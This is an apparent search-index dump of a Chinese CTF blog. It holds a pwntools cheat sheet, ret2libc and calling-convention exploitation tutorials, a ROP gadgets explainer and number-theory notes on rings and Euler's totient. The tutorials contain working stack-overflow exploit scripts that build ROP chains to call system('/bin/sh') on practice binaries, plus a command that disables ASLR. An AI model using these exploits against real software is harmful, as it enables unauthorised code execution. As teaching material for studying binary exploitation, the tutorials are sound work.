[{"categories":["Announcement"],"content":" 关于本博客 本博客虽然提供多语言支持，但是因为我没什么时间，所以可能很少写第二语言的文章， 有兴趣的可以提 PR，感谢！ 突然发现我被 radare2 坑了。我发现这个工具有很多问题，目前正在将所有使用 radare2 作为工具的博客进行修改，使用的工具改为 pwndbg 。 ","date":"2023-08-05","objectID":"/announcement-about-my-blog/:0:0","tags":["Blog"],"title":"[置顶] 博客站点说明","uri":"/announcement-about-my-blog/"},{"categories":["Tools"],"content":"这篇博客记录了 pwntools 库中一些实用的功能。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:0:0","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"0x01 Pwntools Pwntools 是一个 CTF 框架和漏洞利用开发库。它用 Python 编写，专为快速原型设计 和漏洞利用开发而设计，旨在使编写漏洞利用脚本变得尽可能更简单。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:1:0","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x01 安装 如果你是 Arch Linux，可以使用以下命令安装 pwntools： sudo pacman -S python-pwntools ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:1:1","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x02 Windows 很不幸，pwntools 的许多功能在 Windows 上并不适用，因为它使用了 _curses 模块， 而该模块不适用于 Windows。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:1:2","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"0x02 进程和交互 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:2:0","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x01 进程 进程（Process）是你与 pwntools 中的某些内容交互的主要方式，启动一个进程很容易。 p = process('./vulnerable_binary') 你也可以远程连接进程： p = remote('my.special.ip', port) ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:2:1","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x02 发送数据到进程 pwntools 的强大之处在于它可以与你的进程进行极其简单的通信。 2x01 p.send(data) 向进程发送数据，数据可以是 字符串 或 类似字节的对象。pwntools 会为你处理这一切。 2x02 p.sendline(data) 将数据发送到进程，后跟换行符 \\n 。有些程序需要 \\n 来接收输入。 p.sendline(data) 等同于 p.send(data + '\\n') ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:2:2","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x03 从进程接收数据 2x01 p.recv(numb) 从进程接收 numb 大小的字节数据。 2x02 p.recvuntil(delimiter, drop=False) 接收所有数据，直到遇到 分隔符，然后返回数据。如果 drop 为 True ，则返回 的数据不包含 分隔符。 2x03 p.recvline(keepends=True) 本质上相当于 p.recvuntil('\\n', drop=keepends) 。接收直到到达 \\n 的所有 数据，如果 keepends 为 True ，则返回包括 \\n 的接收到的所有数据。 2x04 p.clean(timeout=0.02) 接收超时秒数内的 所有 数据并返回。另一个类似的函数是 p.recvall() ，但这 通常需要很长时间才能执行，因此用 p.clean() 要好得多。 2x05 Timeout 所有接收函数都包含 timeout 参数以及其它列出的参数。 例如，p.recv(numb=16, timeout=1) 将执行，但如果在超时秒内未接收到 numb 大小的字节，则数据将被缓存以供下一个接收函数使用，并返回一个空字符串 '' 。 问题 当 exploit 没有任何问题时，错误的接收数量可能会导致你的漏洞利用程序停止。这应该 是你检查的第一件事。如果你不确定，请改用 p.clean() 。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:2:3","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"0x03 日志 日志是 pwntools 的一个非常有用的功能，它可以让你知道在代码中的哪些位置，并且你 可以以不同的方式记录不同类型的数据。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:3:0","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x01 log.info(text) \u003e\u003e\u003e log.info('Binary Base is at 0x400000') [*] Binary Base is at 0x400000 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:3:1","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x02 log.success(text) \u003e\u003e\u003e log.success('ASLR bypassed! Libc base is at 0xf7653000') [+] ASLR bypassed! Libc base is at 0xf7653000 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:3:2","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x03 log.error(text) \u003e\u003e\u003e log.success('The payload is too long') [-] The payload is too long ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:3:3","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"0x04 上下文 上下文（context）是 pwntools 中的一个全局变量，它允许你只设置某些值一次，以后的所有 函数都会自动使用该数据。 context.arch = 'i386' context.os = 'linux' context.endian = 'little' context.bits = 64 现在，每次生成 shellcode 或使用 p64() 和 u64() 这样的函数时，它都会使用 context 变量。 如果你认为设置很多，这里有个更简单的方法： context.binary = './vulnerable_binary' 这使你能够简化更多的工作。例如，当你使用 process() 时： p = process() 它将自动使用 context 中定义的二进制文件，你无需再次指定它。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:4:0","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"0x05 包装 使用 python 内置的 struct 模块包装通常很痛苦，因为需要记住大量不必要的选项。 pwntools 使这变得轻而易举，使用 context 全局变量自动识别应该如何包装数据。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:5:0","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x01 p64(addr) 根据 context 包装 addr ，默认情况下是 小端字节序。 p64(0x04030201) == b'\\x01\\x02\\x03\\x04' context.endian = 'big' p64(0x04030201) == b'\\x04\\x03\\x02\\x01' 信息 p64() 返回一个类似字节的对象，因此你必须将溢出 Padding 的形式改为 b'A' 而 不仅仅是 'A' 。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:5:1","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x02 u64(data) 根据 context 解包数据；与 p64() 的作用完全相反。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:5:2","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x03 flat(*args) 可以接收一堆参数并根据 context 将它们全部进行包装。完整的功能相当复杂， 但本质上是： payload = flat( 0x01020304, 0x59549342, 0x12186354 ) 等同于 payload = p64(0x01020304) + p64(0x59549342) + p64(0x12186354) 注意 flat() 使用 context ，因此除非你指定它是其它 bits 的，否则它将始终尝试将其 包装为 context 对应的 bits 的数据。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:5:3","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"0x06 ELF pwntools ELF 类是你可能需要的最有用的类，因此了解它的全部功能将使你的生活更轻松。 本质上，ELF 类允许你在运行时查找变量并停止硬编码。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:6:0","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x01 创建一个 ELF 对象 想要创建一个 ELF 对象非常简单： elf = ELF('./vulnerable_program') ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:6:1","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x02 获取进程 我们可以从 ELF 中获取它，而不是指定一个新进程： p = elf.process() ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:6:2","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x03 PLT 和 GOT 表 想做 ret2plt 吗？很简单： puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:6:3","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x04 Functions 需要返回一个名为 vuln 的函数？不必费心使用反汇编器或调试器来查找它在哪里。 main_address = elf.functions['vuln'] 注：elf.functions 返回一个 Function 对象，因此如果你只需要地址，可以使用 elf.symbols ： main_address = elf.symbols['symbol'] ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:6:4","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x05 elf.libc 在本地时，我们可以获取二进制文件运行时使用的 libc 。 libc = elf.libc ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:6:5","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x06 elf.search(needle, writable=False) 在整个二进制文件中搜索特定的字符序列。在做 ret2libc 时非常有用。如果设置了可写， 它只会检查内存中可以写入的部分。注：这会返回一个生成器，因此如果你想要第一个匹配项， 则必须将其包含在 next() 中。 binsh = next(libc.search(b'/bin/sh\\x00')) ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:6:6","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x07 elf.address elf.address 是二进制文件的基地址。如果二进制文件没有启用 PIE，那么它是绝对的； 如果启用了，则所有地址都是相对的（它假设二进制基地址为 0x0）。 设置 address 值会自动更新符号表（symbols）、got、plt 和 functions 的地址， 这在调整 PIE 或 ASLR 时非常有用。 假设你在启用 ASLR 时泄漏了 libc 的基地址；使用 pwntools，获取 ret2libc 的 system 地址将非常容易： libc = elf.libc libc.address = 0xf7f23000 # You 'leaked' this system = libc.symbols['system'] binsh = next(libc.search(b'/bin/sh\\x00')) exit_addr = libc.symbols['exit'] # Now you can do the ret2libc ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:6:7","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"0x07 ROP ROP 类非常强大，使你能够以更少的行创建可读的 ROP 链。 ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:7:0","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x01 创建一个 ROP 对象 rop = ROP(elf) ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:7:1","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x02 添加溢出 Padding rop.raw('A' * 64) ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:7:2","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x03 添加一个包装值 rop.raw(0x12345678) ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:7:3","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x04 调用函数 win() rop.win() 如果你需要参数： rop.win(0xdeadc0de, 0xdeadbeef) ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:7:4","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x05 抛弃逻辑代码 from pwn import * elf = context.binary = ELF('./showcase') rop = ROP(elf) rop.win1(0x12345678) rop.win2(0xdeadbeef, 0xdeadc0de) rop.flag(0xc0ded00d) print(rop.dump()) dump() 输出： 0x0000: 0x40118b pop rdi; ret 0x0008: 0x12345678 [arg0] rdi = 305419896 0x0010: 0x401102 win1 0x0018: 0x40118b pop rdi; ret 0x0020: 0xdeadbeef [arg0] rdi = 3735928559 0x0028: 0x401189 pop rsi; pop r15; ret 0x0030: 0xdeadc0de [arg1] rsi = 3735929054 0x0038: 'oaaapaaa' \u003cpad r15\u003e 0x0040: 0x40110c win2 0x0048: 0x40118b pop rdi; ret 0x0050: 0xc0ded00d [arg0] rdi = 3235827725 0x0058: 0x401119 flag ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:7:5","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x06 发送 ROP 链 p.sendline(rop.chain()) ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:7:6","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["Tools"],"content":"1x07 对比 不使用 pwntools： payload = flat( POP_RDI, 0xdeadc0de, elf.sym['win1'], POP_RDI, 0xdeadbeef, POP_RSI, 0x98765432, elf.sym['win2'], POP_RDI, 0x54545454, elf.sym['flag'] ) p.sendline(payload) 使用 pwntools： rop.win1(0xdeadc0de) rop.win2(0xdeadbeef, 0x98765432) rop.flag(0x54545454) p.sendline(rop.chain()) ","date":"2023-08-18","objectID":"/pwntools-cheetsheet/:7:7","tags":["PWN","Tools"],"title":"Pwntools Cheetsheet","uri":"/pwntools-cheetsheet/"},{"categories":["PWN"],"content":"ret2libc 基于 C 标准库中的 system 函数。该函数会执行传递给它的任何内容， 这使其成为最佳攻击目标。libc 中的另一个内容是字符串 /bin/sh ；如果你将 此字符串传递给 system 函数，它会弹出一个 shell。 这就是它的全部内容——将 /bin/sh 作为参数传递给 system 。 ret2libc.zip /pwn_assets/ret2libc.zip ","date":"2023-08-18","objectID":"/ret2libc/:0:0","tags":["PWN","Stack"],"title":"ret2libc","uri":"/ret2libc/"},{"categories":["PWN"],"content":"0x01 禁用 ASLR 首先，我们将禁用 ASLR。ASLR 随机化 libc 在内存中的地址，这意味着我们无法计算出 system() 和 /bin/sh 的位置。为了便于你理解一般理论，我们将从禁用它开始。 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space ","date":"2023-08-18","objectID":"/ret2libc/:1:0","tags":["PWN","Stack"],"title":"ret2libc","uri":"/ret2libc/"},{"categories":["PWN"],"content":"0x02 手动利用 ","date":"2023-08-18","objectID":"/ret2libc/:2:0","tags":["PWN","Stack"],"title":"ret2libc","uri":"/ret2libc/"},{"categories":["PWN"],"content":"1x01 获取 libc 地址 幸运的是 Linux 有一个名为 ldd 的命令用于动态链接。如果我们用它来查看编译好的 ELF 文件，它会告诉我们它使用的库及其地址。 $ ldd vuln-32 linux-gate.so.1 (0xf7eda000) libc.so.6 =\u003e /usr/lib32/libc.so.6 (0xf7c00000) /lib/ld-linux.so.2 =\u003e /usr/lib/ld-linux.so.2 (0xf7edd000) libc.so.6 是我们需要的 libc 文件，所以 libc 的地址是 0xf7c00000 。 信息 libc 地址以及 system() 和 /bin/sh 的偏移量对你来说可能不同。这不是问题，它只是 意味着你有不同的版本的 libc 。 ","date":"2023-08-18","objectID":"/ret2libc/:2:1","tags":["PWN","Stack"],"title":"ret2libc","uri":"/ret2libc/"},{"categories":["PWN"],"content":"1x02 获取 system() 的地址 为了调用 system() ，我们肯定需要它在内存中的地址。为此，我们可以使用 readelf 命令。 $ readelf -s /usr/lib32/libc.so.6 | grep system 3209: 0004f610 63 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0 -s 参数告诉 readelf 查看当前 ELF 文件的符号表，符号表中的信息只包括 全局变量 和函数名。这里我们可以发现 system() 距 libc 库的偏移量是 0x4f610 。 ","date":"2023-08-18","objectID":"/ret2libc/:2:2","tags":["PWN","Stack"],"title":"ret2libc","uri":"/ret2libc/"},{"categories":["PWN"],"content":"1x03 获取 /bin/sh 的地址 由于 /bin/sh 只是一个字符串，因此我们可以在刚刚通过 ldd 找到的动态链接库的基础上使用 strings 指令。注：当将字符串作为参数传递时，你需要传递指向字符串的 地址，而不是字符串 的十六进制表示形式，因为这就是 C 语言所规定的方式。 $ strings -a -t x /usr/lib32/libc.so.6 | grep /bin/sh 1c4dcd /bin/sh -a 告诉它扫描整个文件；-t x 告诉它以十六进制格式输出偏移量。 ","date":"2023-08-18","objectID":"/ret2libc/:2:3","tags":["PWN","Stack"],"title":"ret2libc","uri":"/ret2libc/"},{"categories":["PWN"],"content":"1x04 32-bit 漏洞利用 from pwn import * context(os='linux', arch='amd64', log_level='info') p = process('./vuln-32') libc_addr = 0xf7c00000 system_addr = libc_addr + 0x4f610 shell_addr = libc_addr + 0x1c4dcd payload = b'A' * 76 # Padding 到 EIP payload += p32(system_addr) # system() 的地址 payload += p32(0x0) # 避免异常 payload += p32(shell_addr) # /bin/sh 的地址 p.sendline(payload) p.interactive() ","date":"2023-08-18","objectID":"/ret2libc/:2:4","tags":["PWN","Stack"],"title":"ret2libc","uri":"/ret2libc/"},{"categories":["PWN"],"content":"1x05 64-bit 漏洞利用 使用链接到 64-bit 程序的 libc 重复上述过程。 注：你必须使用 pop rdi; ret gadget 将其放入 RDI 寄存器中，而不是在返回地址之后传递参数。 $ ROPgadget --binary vuln-64 | grep rdi [...] 0x00000000004011cb : pop rdi ; ret [...] $ ROPgadget --binary vuln-64 | grep rsi [...] 0x00000000004011c9 : pop rsi ; pop r15 ; ret [...] from pwn import * context(os='linux', arch='amd64', log_level='info') p = process('./vuln-64') libc_addr = 0x7ffff7c00000 system_addr = libc_addr + 0x4f760 shell_addr = libc_addr + 0x19fe34 POP_RDI, POP_RSI_R15 = 0x4011cb, 0x4011c9 payload = b'A' * 72 # Padding 到 RIP payload += p64(POP_RDI) # pop rdi ; ret payload += p64(shell_addr) # 传入 /bin/sh 的地址 payload += p64(POP_RSI_R15) # pop rsi ; pop r15 ; ret payload += p64(0x0) * 2 # 填充 rsi 和 r15 payload += p64(system_addr) # 把 system() 的地址传入 RIP p.sendline(payload) p.interactive() ","date":"2023-08-18","objectID":"/ret2libc/:2:5","tags":["PWN","Stack"],"title":"ret2libc","uri":"/ret2libc/"},{"categories":["PWN"],"content":"0x03 使用 pwntools 实现半自动 pwntools 拥有大量功能，使这一切变得更加简单。 # 32-bit from pwn import * context(os='linux', arch='amd64', log_level='info') elf = context.binary = ELF('./vuln-32') p = process() libc = elf.libc # 获取程序正在使用的 libc libc.address = 0xf7c00000 # 设置 libc 地址 system_addr = libc.sym['system'] # 获取 system() 的地址 shell_addr = next(libc.search(b'/bin/sh')) # 获取 /bin/sh 的地址 payload = b'A' * 76 # Padding 到 EIP payload += p32(system_addr) # system() 的地址 payload += p32(0x0) # 避免异常 payload += p32(shell_addr) # /bin/sh 的地址 p.sendline(payload) p.interactive() 64-bit 的半自动脚本本质上是一样的。 技巧 如果题目提供了 libc ，也可以这样用： 信息 pwntools 可以通过其 ROP 功能进一步简化它，但我不会在这里展示它们。 ","date":"2023-08-18","objectID":"/ret2libc/:3:0","tags":["PWN","Stack"],"title":"ret2libc","uri":"/ret2libc/"},{"categories":["PWN"],"content":"利用调用约定。 exploiting_with_params.zip /pwn_assets/exploiting_with_params.zip ","date":"2023-08-11","objectID":"/exploiting-calling-conventions/:0:0","tags":["PWN","Stack"],"title":"攻击调用约定","uri":"/exploiting-calling-conventions/"},{"categories":["PWN"],"content":"0x01 32-bit 程序期望在执行函数之前栈是这样的布局： 那么我们为什么不这样提供呢？除了函数之外，我们还传递返回地址和参数： flag() 地址之后的所有内容都将成为下一个函数的栈帧的一部分，因为它 预期 在那里 ——只是我们没有使用 push 指令，而是手动覆盖它们。 from pwn import * context(os='linux', arch='amd64', log_level='info') p = process('./vuln-32') payload = b'A' * 52 # Padding 到 EIP payload += p32(0x080491c7) # flag() 的地址 payload += p32(0x0) # 避免异常 payload += p32(0xdeadc0de) # 第一个参数 payload += p32(0xc0ded00d) # 第二个参数 p.sendline(payload) p.interactive() ","date":"2023-08-11","objectID":"/exploiting-calling-conventions/:1:0","tags":["PWN","Stack"],"title":"攻击调用约定","uri":"/exploiting-calling-conventions/"},{"categories":["PWN"],"content":"0x02 64-bit 相同的逻辑，只不过我们必须利用之前讨论过的 gadgets 来填充所需的寄存器（在本例中为 rdi 和 rsi ，因为我们有两个参数）。 我们必须在 调用函数之前 填充寄存器： from pwn import * context(os='linux', arch='amd64', log_level='info') p = process('./vuln-64') POP_RDI, POP_RSI_R15 = 0x4011fb, 0x4011f9 payload = b'A' * 56 # Padding 到 RIP payload += p64(POP_RDI) # pop rdi ; ret payload += p64(0xdeadc0de) # 进入 rdi 的值 - 第一个参数 payload += p64(POP_RSI_R15) # pop rsi ; pop r15 ; ret payload += p64(0xc0ded00d) # 进入 rsi 的值 - 第二个参数 payload += p64(0x0) # 进入 r15 的值 - 避免异常 payload += p64(0x40116f) # flag() 的地址 payload += p64(0x0) # 避免异常 p.sendline(payload) p.interactive() 信息 在返回地址后面加 0 本质是为了让程序有个返回的地方，防止异常，不然会返回到下面 奇奇怪怪的东西；有时候也可能是栈对齐，64-bit 程序执行 system 时会有一个检查， 确保栈指针是指着 0 的（结尾是 0），没有对齐的话就不能执行。 通常 0 可以替换为任意值，效果是一样的。只是习惯加 0。 ","date":"2023-08-11","objectID":"/exploiting-calling-conventions/:2:0","tags":["PWN","Stack"],"title":"攻击调用约定","uri":"/exploiting-calling-conventions/"},{"categories":["PWN"],"content":"Gadgets 是一小段后跟 ret 指令的代码。例如：pop rdi; ret 。我们可以操纵这些 gadgets 的 ret ，将它们串成一个链来完成我们想要做的事情。 ","date":"2023-08-11","objectID":"/gadgets/:0:0","tags":["PWN","Stack"],"title":"Gadgets","uri":"/gadgets/"},{"categories":["PWN"],"content":"0x01 例子 假设在执行 pop rdi; ret gadget 期间栈看起来像这样： 很明显：0x10 被弹出到 rdi 中，因为它在弹出到 rdi 前位于栈顶。一旦出栈， rsp 就会移动： 由于 ret 相当于 pop rip ，因此 0x5655576724 被移至 rip 中。 请注意栈是如何布局的。 ","date":"2023-08-11","objectID":"/gadgets/:1:0","tags":["PWN","Stack"],"title":"Gadgets","uri":"/gadgets/"},{"categories":["PWN"],"content":"0x02 使用 Gadgets 当我们覆盖返回地址时，我们覆盖了 rsp 指向的值。一旦该值出栈，它就会 指向栈中的下一个值。但请等待，我们可以覆盖栈中的下一个值。 假设我们想要利用二进制文件跳转到 pop rdi; ret gadget，将 0x100 弹出到 rdi 中，然后跳转到 flag() 。让我们一步步执行： 在原来的 ret 上，我们覆盖了返回地址，我们让 gadget 地址出栈。现在 rip 移动指向到 gadget，rsp 移动到下一个内存地址。 rsp 移动指向到 0x100；rip 变为 pop rdi。现在，当我们出栈时，0x100 被移入 rdi 。 RSP 移动到栈上的下一个项目，即 flag() 的地址。执行 ret 并调用 flag() 。 ","date":"2023-08-11","objectID":"/gadgets/:2:0","tags":["PWN","Stack"],"title":"Gadgets","uri":"/gadgets/"},{"categories":["PWN"],"content":"0x03 总结 本质上，如果 gadget 从栈中弹出值，只需将这些值放在后面（包括 ret 中 的 pop rip）。如果我们想将 0x10 弹出到 rdi 然后跳转到 0x16 ， 我们的 payload 将如下所示： 注：如果你有多个 pop 指令，则可以添加更多值。 信息 之所以使用 rdi 作为示例，是因为如果你还记得的话，那是 64-bit 程序中 的第一个参数的寄存器。这意味着使用该 gadget 控制该寄存器非常重要。 ","date":"2023-08-11","objectID":"/gadgets/:3:0","tags":["PWN","Stack"],"title":"Gadgets","uri":"/gadgets/"},{"categories":["PWN"],"content":"0x04 查找 Gadgets 我们可以使用 ROPGadget 工具来查找可能的 gadgets 。 $ ROPgadget --binary vuln-64 Gadgets information ============================================================ 0x0000000000401069 : add ah, dh ; nop dword ptr [rax + rax] ; ret 0x000000000040109b : add bh, bh ; loopne 0x401105 ; nop ; ret 0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020 [...] 将其与 grep 结合起来查找特定的寄存器： $ ROPgadget --binary vuln-64 | grep rdi 0x0000000000401096 : or dword ptr [rdi + 0x404030], edi ; jmp rax 0x00000000004011db : pop rdi ; ret ","date":"2023-08-11","objectID":"/gadgets/:4:0","tags":["PWN","Stack"],"title":"Gadgets","uri":"/gadgets/"},{"categories":["Cryptography"],"content":"环、域和欧拉函数 $\\varphi$ 的基础知识 ","date":"2023-08-10","objectID":"/rings-fields-and-eulers-totient-function/:0:0","tags":["Crypto"],"title":"环、域和欧拉函数","uri":"/rings-fields-and-eulers-totient-function/"},{"categories":["Cryptography"],"content":"0x01 环 在模运算中，我们对某个模 $m$ 进行取模，我们可以将能够以这种方式使用的数字视为 一组数字： $$\\mathbb{Z}/m\\mathbb{Z} = \\{0, 1, 2, …, m - 1\\}$$ 该环 $\\mathbb{Z}/m\\mathbb{Z}$ 是 模 $m$ 的整数环 。我们可以对这个环的元素 进行加法和乘法操作，然后除以 $m$ 并取余数以获得 $\\mathbb{Z}/m\\mathbb{Z}$ 中 的元素。有一些 通用规则 将其定义为环，包括关联加法和乘法的需要。 ","date":"2023-08-10","objectID":"/rings-fields-and-eulers-totient-function/:1:0","tags":["Crypto"],"title":"环、域和欧拉函数","uri":"/rings-fields-and-eulers-totient-function/"},{"categories":["Cryptography"],"content":"环的单位 正如我们所讨论的，如果 $gcd(a, m) = 1$，$a \\in \\mathbb{Z}/m\\mathbb{Z}$ 具有模逆元。 所有具有模逆元的数字的集合表示为 $(\\mathbb{Z}/m\\mathbb{Z})^{*}$ ，这称为模 $m$ 的 单位群。有倒数的数称为 单位。例如： $$(\\mathbb{Z}/12\\mathbb{Z})^{*} = \\{1, 5, 7, 11\\}$$ 你可以将模 $12$ 的单位组视为本质上包含所有小于 $12$ 且与其互质的数字的集合。 ","date":"2023-08-10","objectID":"/rings-fields-and-eulers-totient-function/:1:1","tags":["Crypto"],"title":"环、域和欧拉函数","uri":"/rings-fields-and-eulers-totient-function/"},{"categories":["Cryptography"],"content":"0x02 域 如果 $\\mathbb{Z}/m\\mathbb{Z}$ 中的每个数都有模逆元，则它将从 环 提升为 域（域是一种 可以做除法的环）。请注意，唯一可能的 $m$ 值是素数，这就是这些字段通常表示为 $F_{p}$ 的原因。有限域（伽罗瓦域） 是具有有限数量元素的域，例如模运算中使用的域。因此， 有限域这个术语会经常出现来描述 $F_{p}$ 。 ","date":"2023-08-10","objectID":"/rings-fields-and-eulers-totient-function/:2:0","tags":["Crypto"],"title":"环、域和欧拉函数","uri":"/rings-fields-and-eulers-totient-function/"},{"categories":["Cryptography"],"content":"相关集合 $\\mathbb{Z}$ 表示 整数环 。请注意它不是一个域，因为没有分数可以提供逆元。 ","date":"2023-08-10","objectID":"/rings-fields-and-eulers-totient-function/:2:1","tags":["Crypto"],"title":"环、域和欧拉函数","uri":"/rings-fields-and-eulers-totient-function/"},{"categories":["Cryptography"],"content":"0x03 欧拉函数 欧拉函数返回单位组中以 $m$ 为模的元素数量。从数学上来说，这意味着： $$\\phi(m) = \\#(\\mathbb{Z}/m\\mathbb{Z})^{*} = \\#\\{0 \\le a \u003c m : gcd(a, m) = 1\\}$$ 这个函数有大量的应用程序和进一步的规则，使我们能够做一些非常棒的事情，并且是 RSA 密码 系统的关键部分。 ","date":"2023-08-10","objectID":"/rings-fields-and-eulers-totient-function/:3:0","tags":["Crypto"],"title":"环、域和欧拉函数","uri":"/rings-fields-and-eulers-totient-function/"},{"categories":["Cryptography"],"content":"1x01 总计规则 如果 $gcd(p, q) = 1$ 则 $\\phi(pq) = \\phi(p)\\phi(q)$ 。 ","date":"2023-08-10","objectID":"/rings-fields-and-eulers-totient-function/:3:1","tags":["Crypto"],"title":"环、域和欧拉函数","uri":"/rings-fields-and-eulers-totient-function/"},{"categories":["Cryptography"],"content":"1x02 计算欧拉函数 如果我们说 $n$ 的质因数分解是 $n = p_{1}^{e_{1}} \\cdot p_{2}^{e_{2}} \\cdot … \\cdot p_{k}^{e_{k}}$ 那么： $$\\phi(n) = n \\prod_{p \\mid n}(1 - \\frac{1}{p})$$ 请注意，如果 $p$ 是素数，则 $\\phi(p) = p − 1$ 。 证明 TODO ","date":"2023-08-10","objectID":"/rings-fields-and-eulers-totient-function/:3:2","tags":["Crypto"],"title":"环、域和欧拉函数","uri":"/rings-fields-and-eulers-totient-function/"},{"categories":["Cryptography"],"content":"1x03 欧拉公式 欧拉公式指出，如果 $gcd(a, p) = 1$ 那么： $$a^{\\phi(n)} \\equiv 1 \\mod n$$ 这可能是 RSA 密码系统最重要的公式，我们很快就会讲到。请注意，这实际上告诉我们 更多关于以素数 $p$ 为模的情况，这种情况以费马命名。 ","date":"2023-08-10","objectID":"/rings-fields-and-eulers-totient-function/:3:3","tags":["Crypto"],"title":"环、域和欧拉函数","uri":"/rings-fields-and-eulers-totient-function/"},{"categories":["Cryptography"],"content":"1x04 费马小定理 由于 $\\phi(p) = p − 1$，费马小定理指出： $$a^{p-1} \\equiv 1 \\mod p$$ 这是费马在欧拉公式提出前 100 多年提出的。你可能会注意到，这也为我们提供了一种 快速计算 $Fp$ 中 $a$ 的模反元素的方法： \\[a^{p-1} \\equiv 1 \\mod p \\\\ a^{p-1} \\cdot a^{-1} \\equiv 1 \\cdot 